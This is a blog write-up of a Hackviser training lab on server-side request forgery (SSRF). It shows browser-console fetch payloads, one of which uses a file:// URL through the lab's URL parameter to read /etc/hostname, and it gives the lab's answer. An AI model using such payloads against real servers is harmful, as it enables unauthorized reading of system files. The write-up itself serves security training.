---
title: 'Server-Side Request Forgery (SSRF)'
date: '2026-03-01'
excerpt: 'Practice Server-Side Request Forgery (SSRF) attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_ssrf/ssrf_hackviser_logo.png" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Server-Side Request Forgery (SSRF)</h1>
<div class="writeup-date">April 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Server-Side Request Forgery (SSRF) attacks in multiple lab exercises.</p>

<h5 class="mb-2">1. Basic SSRF</h5>
<p class="mb-3"><strong>This lab contains a Server-Side Request Forgery (SSRF) vulnerability in a PHP-based web application. To complete the lab, exploit the SSRF vulnerability in the URL parameter to obtain the server's hostname information. What is the server's hostname?</strong></p>
<p class="mb-3">The web app shows a slideshow of beautiful photos.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_ssrf/ssrf_hackviser_image1.png" alt="Web Application Security SSRF 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Let's try directly with this payload in the browser console:</p>
<pre>fetch(&quot;/fetch.php?url=http://localhost/hostname&quot;)
  .then(r =&gt; r.text())
  .then(data =&gt; console.log(&quot;Result:&quot;, data));
</pre>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_ssrf/ssrf_hackviser_image2.png" alt="Web Application Security SSRF 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">However we get 502 Bad Gateway and Upstream fetch failed errors that suggest the server tried to reach http://localhost/hostname, but there isn't a web server listening on port 80 that has a file named "hostname." An alternative is to look into standard Linux file locations. Adjusting the payload to the following returns the hostname in the browser console.</p>
<pre>fetch(&quot;/fetch.php?url=file:///etc/hostname&quot;)
  .then(r =&gt; r.text())
  .then(data =&gt; console.log(&quot;Result:&quot;, data));
</pre>
<p class="mb-5"><strong>Answer:</strong> reducto</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">April 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>